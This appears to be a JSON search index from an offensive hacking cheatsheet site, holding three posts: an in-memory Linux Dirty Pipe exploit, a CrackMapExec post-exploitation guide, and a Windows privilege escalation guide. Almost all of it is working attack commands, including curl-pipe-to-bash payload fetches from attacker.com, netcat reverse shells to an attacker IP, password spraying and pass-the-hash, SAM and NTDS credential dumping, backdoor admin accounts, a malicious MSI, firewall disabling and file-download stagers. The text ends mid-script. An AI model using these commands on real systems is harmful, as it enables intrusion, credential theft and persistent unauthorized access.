[
{
	"uri": "/cheatsheet/tags/antivirus-evasion/",
	"title": "Antivirus Evasion",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/blog/",
	"title": "Blogs",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/blog/executing-linux-binaries-without-touching-disk/",
	"title": "Executing Linux Binaries Without Touching Disk",
	"tags": ["offensive", "linux", "Antivirus Evasion"],
	"description": "A technique to run binaries filelessly and stealthily on Linux Without Touching Disk.",
	"content": "Executing Linux Binaries Without Touching Disk Limitation This attack depends on the following tools to work.\ndd bash | zsh | ash (busybox) setarch | linux64 (busybox) head tail cut grep od readlink wc tr base64 sleep Example of Running Dirty Pipe exploit in memory without touching the disk to gain root privielges. Running Dirty Pipe exploit on the target machine without touching the disk. Dirty pip exploit needs a setuid binary we will use /usr/bin/pkexec which is a setuid binary to gain privielge escalation.\nIn Attacker machine. # Download \u0026amp; compile the dirty pipe https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c gcc exploit-2.c -o dp-setuid # Base64 encode the dp-setuid. base64 -w0 ./dp-setuid \u0026gt; dp-setuid.b64 # Download DDexec. https://github.com/arget13/DDexec # Run http listenor  python3 -m http.server 80 In Target machine. # Run the following command curl attacker.com/dp-setuid.b64 | bash \u0026lt;(curl attacker.com/ddexec.sh) /bin/randomename /usr/bin/pkexec "
},
{
	"uri": "/cheatsheet/",
	"title": "exploit-me.com",
	"tags": [],
	"description": "Hacking Tricks/Techniques.",
	"content": ""
},
{
	"uri": "/cheatsheet/tags/linux/",
	"title": "linux",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/tags/offensive/",
	"title": "offensive",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/about/",
	"title": "Abouts",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/about/naveed/",
	"title": "Naveed",
	"tags": ["offensive", "linux", "Privilege"],
	"description": "This post is about...",
	"content": ""
},
{
	"uri": "/cheatsheet/tags/privilege/",
	"title": "Privilege",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/about/hbkhan/",
	"title": "Hbkhan",
	"tags": ["offensive", "linux", "Privilege"],
	"description": "This post is about...",
	"content": ""
},
{
	"uri": "/cheatsheet/about/asif/",
	"title": "Khanisgr8",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/tags/active-directory/",
	"title": "Active-Directory",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/tags/crackmapexec/",
	"title": "crackmapexec",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/blog/crackmapexec/",
	"title": "CrackMapExec (a.k.a CME) ",
	"tags": ["offensive", "post-exploitation", "crackmapexec", "Active-Directory"],
	"description": "A Guide to CrackMapExec.A post-exploitation tool for Active Directory networks.",
	"content": "CrackMapExec # General help crackmapexec --help # Protocol help cracmapexec smb --help Connections \u0026amp; Spraying # Target format crackmapexec smb ms.evilcorp.org crackmapexec smb 192.168.1.0 192.168.0.2 crackmapexec smb 192.168.1.0-28 10.0.0.1-67 crackmapexec smb 192.168.1.0/24 crackmapexec smb targets.txt # Null session crackmapexec smb 192.168.10.1 -u \u0026#34;\u0026#34; up \u0026#34;\u0026#34; # Connect to target using local account crackmapexec smb 192.168.215.138 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASSWORD\u0026#39; --local-auth # Pass the hash against a subnet crackmapexec smb 172.16.157.0/24 -u administrator -H \u0026#39;LMHASH:NTHASH\u0026#39; --local-auth crackmapexec smb 172.16.157.0/24 -u administrator -H \u0026#39;NTHASH\u0026#39; # Bruteforcing and Password Spraying crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin\u0026#34; -p \u0026#34;password1\u0026#34; crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin\u0026#34; -p \u0026#34;password1\u0026#34; \u0026#34;password2\u0026#34; crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin1\u0026#34; \u0026#34;admin2\u0026#34; -p \u0026#34;P@ssword\u0026#34; crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt Enumeration Users # Enumerate users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --users # Perform RID Bruteforce to get users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --rid-brute # Enumerate domain groups crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --groups # Enumerate local users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --local-users Hosts # Generate a list of relayable hosts (SMB Signing disabled) crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt # Enumerate available shares crackmapexec smb 192.168.215.138 -u \u0026#39;user\u0026#39; -p \u0026#39;PASSWORD\u0026#39; --local-auth --shares # Get the active sessions crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --sessions # Check logged in users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --lusers # Get the password policy crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --pass-pol Execution \u0026amp; Co # CrackMapExec has 3 different command execution methods (in default order) : # - wmiexec --\u0026gt; WMI # - atexec --\u0026gt; scheduled task # - smbexec --\u0026gt; creating and running a service # Execute command through cmd.exe (admin privileges required) crackmapexec smb 192.168.10.11 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -x \u0026#39;whoami\u0026#39; # Force the smbexec method crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;net user Administrator /domain\u0026#39; --exec-method smbexec # Execute commands through PowerShell (admin privileges required) crackmapexec smb 192.168.10.11 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -X \u0026#39;whoami\u0026#39; Getting Credentials # Dump local SAM hashes crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --sam # Enable or disable WDigest to get credentials from the LSA Memory crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --wdigest enable crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --wdigest disable # Then you juste have to wait the user logoff and logon again # But you can force the logoff crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;quser\u0026#39; crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;logoff \u0026lt;sessionid\u0026gt;\u0026#39; # Dump the NTDS.dit from DC using methods from secretsdump.py # Uses drsuapi RPC interface create a handle, trigger replication # and combined with additional drsuapi calls to convert the resultant  # linked-lists into readable format crackmapexec smb 192.168.1.100 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds # Uses the Volume Shadow copy Service crackmapexec smb 192.168.1.100 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds vss # Dump the NTDS.dit password history smb 192.168.1.0/24 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds-history Using the database # The database automatically store every hosts reaches by CME and all credentials with admin access $ cmedb # Using workspaces cmedb\u0026gt; workspace create test cmedb\u0026gt; workspace test # Access a protocol database and switch back cmedb (test)\u0026gt; proto smb cmedb (test)\u0026gt; back # List stored hosts cmedb\u0026gt; hosts # View detailed infos for a specific machine (including creds) cmedb\u0026gt; hosts \u0026lt;hostname\u0026gt; # Get stored credentials cmedb\u0026gt; creds # Get credentials access for a specific account cmedb\u0026gt; creds \u0026lt;username\u0026gt; # Using credentials from the database crackmapexec smb 192.168.100.1 -id \u0026lt;credsID\u0026gt; Modules # List available modules crackmapexec smb -L # Module information crackmapexec smb -M mimikatz --module-info # View module options crackmapexec smb -M mimikatz --options # Mimikatz module crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth -M mimikatz crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -M mimikatz crackmapexec smb 192.168.215.104 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -M mimikatz -o COMMAND=\u0026#39;privilege::debug\u0026#39; [*] Get-ComputerDetails Enumerates sysinfo [*] bloodhound Executes the BloodHound recon script on the target and retreives the results to the attackers\\\u0026#39; machine [*] empire_exec Uses Empire\\\u0026#39;s RESTful API to generate a launcher for the specified listener and executes it [*] enum_avproducts Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI [*] enum_chrome Decrypts saved Chrome passwords using Get-ChromeDump [*] enum_dns Uses WMI to dump DNS from an AD DNS Server [*] get_keystrokes Logs keys pressed, time and the active window [*] get_netdomaincontroller Enumerates all domain controllers [*] get_netrdpsession Enumerates all active RDP sessions [*] get_timedscreenshot Takes screenshots at a regular interval [*] gpp_autologin Searches the domain controller for registry.xml to find autologon information and returns the username and password. [*] gpp_password Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. [*] invoke_sessiongopher Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher [*] invoke_vnc Injects a VNC client in memory [*] met_inject Downloads the Meterpreter stager and injects it into memory [*] mimikatz Dumps all logon credentials from memory [*] mimikatz_enum_chrome Decrypts saved Chrome passwords using Mimikatz [*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager [*] mimikittenz Executes Mimikittenz [*] multirdp Patches terminal services in memory to allow multiple RDP users [*] netripper Capture`\\\u0026#39;s credentials by using API hooking [*] pe_inject Downloads the specified DLL/EXE and injects it into memory [*] rdp Enables/Disables RDP [*] scuffy Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares [*] shellcode_inject Downloads the specified raw shellcode and injects it into memory [*] slinky Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions [*] test_connection Pings a host [*] tokens Enumerates available tokens [*] uac Checks UAC status [*] wdigest Creates/Deletes the \u0026#39;UseLogonCredential\u0026#39; registry key enabling WDigest cred dumping on Windows \u0026gt;= 8.1 [*] web_delivery Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module Getting shells Metasploit # First, set up a HTTP Reverse Handler msf \u0026gt; use exploit/multi/handler msf exploit(handler) \u0026gt; set payload windows/meterpreter/reverse_https msf exploit(handler) \u0026gt; set LHOST 192.168.10.3 msf exploit(handler) \u0026gt; set exitonsession false msf exploit(handler) \u0026gt; exploit -j # Met_Inject module crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444 Empire # Start RESTful API empire --rest --user empireadmin --pass gH25Iv1K68@^ # First setup an Empire HTTP listener (Empire: listeners) \u0026gt; set Name test (Empire: listeners) \u0026gt; set Host 192.168.10.3 (Empire: listeners) \u0026gt; set Port 9090 (Empire: listeners) \u0026gt; set CertPath data/empire.pem (Empire: listeners) \u0026gt; run (Empire: listeners) \u0026gt; list # Start RESTful API # The username and password that CME uses to authenticate to Empire\u0026#39;s RESTful API  # Are stored in the cme.conf file located at ~/.cme/cme.conf empire --rest --user empireadmin --pass gH25Iv1K68@^ # Empire Module crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest "
},
{
	"uri": "/cheatsheet/tags/post-exploitation/",
	"title": "post-exploitation",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/tags/windows/",
	"title": "windows",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/cheatsheet/blog/windows-privilege-escalation/",
	"title": "Windows Privilege Escalation.",
	"tags": ["windows", "privilege", "offensive"],
	"description": "A Guide to do Windows Privilege Escalation.",
	"content": "Windows Privilege Escalation. EoP 0: System info Finding installed software, running processes, bind ports, and OS version might be critical to identify the right EoP vector.\nFind installed patches, architecture, OS version $ systeminfo\nGet exact OS version $ type C:/Windows/system32/eula.txt\nHostname. $ hostname\nFind current user. $ echo %username%\nList all users $ net users\nInformation about a user $ net users Administrator\nNetwork information $ ipconfig /all \u0026amp; route print \u0026amp; arp -a\nEnvironment $ set\nList open connections $ netstat -aton\nFirewall information\n$ netsh firewall show state $ netsh firewall show config List scheduled tasks\n$ schtasks /query /fo LIST /v\nList windows services\n$ net start\n$ wmic service list brief\n$ tasklist /SVC\nEoP 1: Incorrect permissions in services A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.\nWe are interested in services where permissions are: BUILTIN\\Users with (F) or (C) or (M) for our group. More info about permissions:\nhttps://msdn.microsoft.com/en-us/library/bb727008.aspx Common exploitation payloads involve: Replacing the affecting binary with a reverse shell or a command that creates a new user and adds it to the Administrator group. Replace the affected service with your payload and and restart the service running:\n$ wmic service NAMEOFSERVICE call startservice net stop [service name] \u0026amp;\u0026amp; net start [service name] $ sc start/stop serviceName\nThe following commands will print the affected services:\n$ for /f \u0026#34;tokens=2 delims=\u0026#39;=\u0026#39;\u0026#34; %a in (\u0026#39;wmic service list full^|find /i \u0026#34;pathname\u0026#34;^|find /i /v \u0026#34;system32\u0026#34;\u0026#39;) do @echo %a \u0026gt;\u0026gt; c:\\windows\\temp\\permissions.txt $ for /f eol^=^\u0026#34;^ delims^=^\u0026#34; %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \u0026#34;%a\u0026#34; If wmic is not available we can use sc.exe:\n$ sc query state= all | findstr \u0026#34;SERVICE_NAME:\u0026#34; \u0026gt;\u0026gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \u0026#34;tokens=2 delims= \u0026#34; %i in (Servicenames.txt) DO @echo %i \u0026gt;\u0026gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \u0026#34;BINARY_PATH_NAME\u0026#34; \u0026gt;\u0026gt; path.txt You can also manually check each service using cacls:\n$ cacls \u0026quot;C:\\path\\to\\file.exe\u0026quot;\nIf you don\u0026rsquo;t have access to vmic, you can do:\n$ sc qc upnphost\nWindows XP SP1 is known to be vulnerable to EoP in upnphost. You get Administrator with:\n$ sc config upnphost binpath= \u0026#34;C:\\Inetpub\\wwwroot\\nc.exe YOUR_IP 1234 -e C:\\WINDOWS\\System32\\cmd.exe\u0026#34; sc config upnphost obj= \u0026#34;.\\LocalSystem\u0026#34; password= \u0026#34;\u0026#34; sc qc upnphost If it fails because of a missing dependency, run the following:\n$ sc config SSDPSRV start= auto net start SSDPSRV net start upnphost Or remove the dependency:\n$ sc config upnphost depend= \u0026#34;\u0026#34; Using meterpreter:\n\u0026gt; exploit/windows/local/service_permissions If wmic and sc is not available, you can use accesschk. For Windows XP, version 5.2 of accesschk is needed:\nhttps://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe $ accesschk.exe -uwcqv \u0026#34;Authenticated Users\u0026#34; * /accepteula $ accesschk.exe -qdws \u0026#34;Authenticated Users\u0026#34; C:\\Windows\\ /accepteula $ accesschk.exe -qdws Users C:\\Windows\\ Then query the service using Windows sc:\n$ sc qc \u0026lt;vulnerable service name\u0026gt;\nThen change the binpath to execute your own commands (restart of the service will most likely be needed):\n$ sc config \u0026lt;vuln-service\u0026gt; binpath= \u0026#34;net user backdoor backdoor123 /add\u0026#34; $ sc stop \u0026lt;vuln-service\u0026gt; $ sc start \u0026lt;vuln$ -service\u0026gt; $ sc config \u0026lt;vuln-service\u0026gt; binpath= \u0026#34;net localgroup Administrators backdoor /add\u0026#34; $ sc stop \u0026lt;vuln-service\u0026gt; $ sc start \u0026lt;vuln-service\u0026gt; Note - Might need to use the depend attribute explicitly:\n$ sc stop \u0026lt;vuln-service\u0026gt; sc config \u0026lt;vuln-service\u0026gt; binPath= \u0026#34;c:\\inetpub\\wwwroot\\runmsf.exe\u0026#34; depend= \u0026#34;\u0026#34; start= demand obj= \u0026#34;.\\LocalSystem\u0026#34; password= \u0026#34;\u0026#34; sc start \u0026lt;vuln-service\u0026gt; EoP 2: Find unquoted paths If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges. This occurs because windows will try, for every whitespace, to find the binary in every intermediate folder.\nFor example, the following path would be vulnerable:\nC:\\Program Files\\something\\winamp.exe We could place our payload with any of the following paths:\nC:\\Program.exe C:\\Program Files.exe The following command will display affected services:\n$ wmic service get name,displayname,pathname,startmode |findstr /i \u0026quot;Auto\u0026quot; |findstr /i /v \u0026quot;C:\\Windows\\\\\u0026quot; |findstr /i /v \u0026quot;\u0026quot;\u0026quot; We might even be able to override the service executable, always check out the permissions of the service binary:\n$ icacls \u0026quot;C:\\Program Files (x86)\\Program Folder\u0026quot; You can autoamte with meterpreter:\n\u0026gt; exploit/windows/local/trusted_service_path EoP 3: ClearText passwords (quick hits) We might somtetimes find passwords in arbitrary files, you can find them running:\n$ findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini Find all those strings in config files.\n$ dir /s *pass* == *cred* == *vnc* == *.config* Find all passwords in all files.\n$ findstr /spin \u0026quot;password\u0026quot; *.* $ findstr /spin \u0026quot;password\u0026quot; *.* These are common files to find them in. They might be base64-encoded. So look out for that.\n$ type c:\\sysprep.inf type c:\\sysprep\\sysprep.xml type c:\\unattend.xml type %WINDIR%\\Panther\\Unattend\\Unattended.xml type %WINDIR%\\Panther\\Unattended.xml $ dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini Stuff in the registry:\n$ reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s reg query \u0026quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026quot; reg query \u0026quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\u0026quot; reg query \u0026quot;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\u0026quot; reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password Search for password in registry\n$ reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Using meterpreter:\n\u0026gt; post/windows/gather/credentials/gpp \u0026gt; post/windows/gather/enum_unattend EoP 4: Pass the hash Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.\nWindows hash format:\nuser:group:id:ntlmpassword:: You can do a hash dump in the affected system running:\nwce32.exe -w wce64.exe -w fgdump.exe Download and run fgdump.exe on the target machine.\n $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80 $ pth-winexe -U DOMAIN/user%hash //$ip cmd or:\nexport SMBHASH=xxx $ pth-winexe -U user% //$ip cmd You can also do run as, with the hash:\nTechnique 1:\nC:\\Windows\\System32\\runas.exe /env /noprofile /user:\u0026lt;username\u0026gt; \u0026lt;password\u0026gt; \u0026quot;c:\\users\\Public\\nc.exe -nc \u0026lt;attacker-ip\u0026gt; 4444 -e cmd.exe\u0026quot; Technique 2:\n$ secpasswd = ConvertTo-SecureString \u0026quot;\u0026lt;password\u0026gt;\u0026quot; -AsPlainText -Force $ mycreds = New-Object System.Management.Automation.PSCredential (\u0026quot;\u0026lt;user\u0026gt;\u0026quot;, $secpasswd) $ computer = \u0026quot;\u0026lt;hostname\u0026gt;\u0026quot; [System.Diagnostics.Process]::Start(\u0026quot;C:\\users\\public\\nc.exe\u0026quot;,\u0026quot;\u0026lt;attacker_ip\u0026gt; 4444 -e cmd.exe\u0026quot;, $mycreds.Username, $mycreds.Password, $computer) $ powershell -ExecutionPolicy Bypass -File c:\\users\\public\\r.ps1 Technique 3:\n$ psexec64 \\\\COMPUTERNAME -u Test -p test -h \u0026quot;c:\\users\\public\\nc.exe -nc \u0026lt;attacker_ip\u0026gt; 4444 -e cmd.exe\u0026quot; EoP 5: Services only available from loopback You can find services bind to the loopback interface that are not reachable through the network running.look for LISTENING/LISTEN:\nnetstat -ano Port forward using plink\n$ plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080 Port forward using meterpreter\n$ portfwd add -l \u0026lt;attacker port\u0026gt; -p \u0026lt;victim port\u0026gt; -r \u0026lt;victim ip\u0026gt; portfwd add -l 3306 -p 3306 -r 192.168.1.101 If powershell is blocked, you can download:\nhttps://github.com/Ben0xA/nps Once you know the updates installed, you can find known exploits using windows-exploit-suggester.\n$ ./windows-exploit-suggester.py -d 2017-02-09-mssb.xls -p ms16-075 [*] initiating winsploit version 3.2… [*] database file detected as xls or xlsx based on extension [*] searching all kb’s for bulletin id MS16-075 [+] relevant kbs [‘3164038’, ‘3163018’, ‘3163017’, ‘3161561’] [*] done Compile windows exploit in linux:\n$ i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe Compiling python scripts to executables:\n$ wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py EoP 6: AlwaysInstallElevated AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.\nCheck if these 2 registry values are set to \u0026ldquo;1\u0026rdquo;:\n$ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated If they are, create your own malicious msi:\n$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi Then use msiexec on victim to execute your msi:\n$ msiexec /quiet /qn /i C:\\evil.msi Metasploit module:\n\u0026gt; use exploit/windows/local/always_install_elevated EoP 7: Vulnerable drivers Third party drivers might contain vulnerabilities, find them running:\n$ DRIVERQUERY EoP 8: Kernel vulnerabilities Run exploit suggester against systeminfo:\nhttps://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py $ python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt Find installed paths:\n$ wmic qfe get Caption,Description,HotFixID,InstalledOn Comprehensive talbes of vulnerabilities below:\neDB Vuln Name MS# 2K XP 2003 2008 Vista 7 271 Lsasrv.dll MS04-011 SP2,3,4 SP0,1 - - - - 350 Util Manager MS04-019 SP2,3,4 - - - - - 351 POSIX MS04-020 SP4 - - - - - 352 Univ lang. UtilMS04-019 - SP2,3,4 - - - - 355 Univ lang. UtilMS04-019 - SP2,3,4 - - - - 1149 PnP Service MS05-039 P4 SP2 SP1 - - - 1197 keybd_event - all all all - - - 1198 CSRSS MS05-018 SP3,4 SP1,2 - - - - 1407 Kernel APC MS05-055 SP4 - - - - - 1911 Mrxsmb.sys MS06-030 all SP2 - - - - 2412 Windows Kernel MS06-049 SP4 - - - - - 3220 Print spool - - All - - - - 5518 win32k.sys MS08-025 SP4 SP2 SP1,2 SP0 SP0,1 - 6705 Churrasco MS09-012 - - All - - - 6705 Churraskito - - All All - - - 21923 Winlogon - All All - - - - 11199 KiTrap0D MS10-015 All All All All All All 14610 Chimichurri MS10-059 - - - All All SP0 15589 Task Scheduler MS10-092 - - - SP0,1,2 SP1,2 SP0 18176 AFD.Sys MS11-080 - SP3 SP3 - - - 100 RPC DCOM MS03-026 SP3,4 - - - - - 103 RPC2 MS03-039 all (CN) - - - - - 109 RPC2 MS03-039 all - - - - - 119 Netapi MS03-049 SP4 - - - - - 3022 ASN.1 MS04-007 SP2,3,4 SP0,1 - - - - 275 SSL BOF MS04-011 SP4 ? - - - - 295 Lsasarv.dll MS04-011 SP2,3,4 SP0,1 - - - - 734 NetDDE BOF MS04-031 SP2,3,4 SP0,1 - - - - 1075 Messaging QueueMS05-017 SP3,4 SP0,1 - - - - 1149 PnP Service MS05-039 SP4 - - - - - 2223 CP MS06-040 - SP1 - - - - 2265 NetIPSRemote MS06-040 SP0-4 SP0,1 - - - - 2789 NetPManageIP MS06-070 SP4 - - - - - 7104 Service exec MS08-067 SP4 SP2,3 SP1,2 SP0 SP0,1 - 7132 Service exec MS08-067 SP4 - SP2 - - - 14674 SRV2.SYS SMB MS09-050 - - - - SP1,2 -  MS* HotFix OS MS16-032 KB3143141 Windows Server 2008 ,7,8,10 Windows Server 2012 MS16-016 KB3136041 Windows Server 2008, Vista, 7 WebDAV MS15-051 KB3057191 Windows Server 2003, Windows Server 2008, Windows 7, Windows 8, Windows 2012 MS14-058 KB3000061 Windows Server 2003, Windows Server 2008, Windows Server 2012, 7, 8 Win32k.sys MS14-040 KB2975684 Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 MS14-002 KB2914368 Windows XP, Windows Server 2003 MS13-005 KB2778930 Windows Server 2003, Windows Server 2008, 7, 8, MS10-092 KB2305420 Windows Server 2008, 7 MS10-015 KB977165 Windows Server 2003, Windows Server 2008, 7, XP MS14-002 KB2914368 Windows Server 2003, XP MS15-061 KB3057839 Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 MS11-080 KB2592799 Windows Server 2003, XP MS11-062 KB2566454 Windows Server 2003, XP MS15-076 KB3067505 Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 MS16-075 KB3164038 Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 MS15-010 KB3036220 Windows Server 2003, Windows Server 2008, 7, XP MS11-046 KB2503665 Windows Server 2003, Windows Server 2008, 7, XP MS11-011 (KB2393802) MS10-059 (KB982799) MS10-021 (KB979683) MS11-080 (KB2592799) Exploits worth looking at: MS11-046\nhttps://github.com/SecWiki/windows-kernel-exploits Windows version map\nOperating System Version Number Windows 1.0 1.04 Windows 2.0 2.11 Windows 3.0 3 Windows NT 3.1 3.10.528 Windows for Workgroups 3.11 3.11 Windows NT Workstation 3.5 3.5.807 Windows NT Workstation 3.51 3.51.1057 Windows 95 4.0.950 Windows NT Workstation 4.0 4.0.1381 Windows 98 4.1.1998 Windows 98 Second Edition 4.1.2222 Windows Me 4.90.3000 Windows 2000 Professional 5.0.2195 Windows XP 5.1.2600 Windows Vista 6.0.6000 Windows 7 6.1.7600 Windows 8.1 6.3.9600 Windows 10 10.0.10240 EoP 9: Automated tools Powersploit\nhttps://github.com/PowerShellMafia/PowerSploit Get-GPPPassword Get-UnattendedInstallFile Get-Webconfig Get-ApplicationHost Get-SiteListPassword Get-CachedGPPPassword Get-RegistryAutoLogon Metasploit\npost/windows/gather/credentials/gpp post/windows/gather/enum_unattend getsystem getprivs use priv hashdump Metasploit incognito\nuse incognito list_tokens -u list_tokens -g impersonate_token DOMAIN_NAME\\\\USERNAME steal_token PID drop_token rev2self Useful commands Add a new user\n$ net user test 1234 /add $ net localgroup administrators test /add Print files contents:\n$ type file Remove file\n$ del /f file Change password for user:\n$ net user \u0026lt;user\u0026gt; \u0026lt;password\u0026gt; List users:\n$ net user Info about a user:\n$ net user \u0026lt;username\u0026gt; Permissions on a folder recursively:\n$ cacls *.* /t /e /g domainname\\administrator:f tasklist or wmic process or tasklist /svc\nEnable RDP access\nreg add \u0026quot;hklm\\system\\currentcontrolset\\control\\terminal server\u0026quot; /f /v fDenyTSConnections /t REG_DWORD /d 0 netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable Disable firewall\n$ netsh firewall set opmode disable Run exploit\nC:\\tmp\u0026gt;powershell -ExecutionPolicy ByPass -command \u0026quot;\u0026amp; { . C:\\tmp\\Invoke-MS16-032.ps1; Invoke-MS16-032 }\u0026quot; Transferring files Paste the following code to get nc in the victim:\necho open \u0026lt;attacker_ip\u0026gt; 21\u0026gt; ftp.txt echo USER offsec\u0026gt;\u0026gt; ftp.txt echo ftp\u0026gt;\u0026gt; ftp.txt echo bin \u0026gt;\u0026gt; ftp.txt echo GET nc.exe \u0026gt;\u0026gt; ftp.txt echo bye \u0026gt;\u0026gt; ftp.txt ftp -v -n -s:ftp.txt nc.exe \u0026lt;attacker_ip\u0026gt; 1234 -e cmd.exe Bounce port sanning\n$ nc $ip 21 220 Femitter FTP Server ready. USER anonymous 331 Password required for anonymous. PASS foo 230 User anonymous logged in. PORT 127,0,0,1,0,80 200 Port command successful. LIST Nice trick to share folders with RDP:\n$ rdesktop (ip) -r disk:share=/home/bayo/store With powershell:\n$ powershell -c \u0026quot;(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\\Users\\YOURUSER\\Desktop\\b.exe')\u0026quot; Paste the following block in a command line to get a web client:\necho strUrl = WScript.Arguments.Item(0) \u0026gt; wget.vbs echo StrFile = WScript.Arguments.Item(1) \u0026gt;\u0026gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 \u0026gt;\u0026gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 \u0026gt;\u0026gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 \u0026gt;\u0026gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 \u0026gt;\u0026gt; wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts \u0026gt;\u0026gt; wget.vbs echo Err.Clear 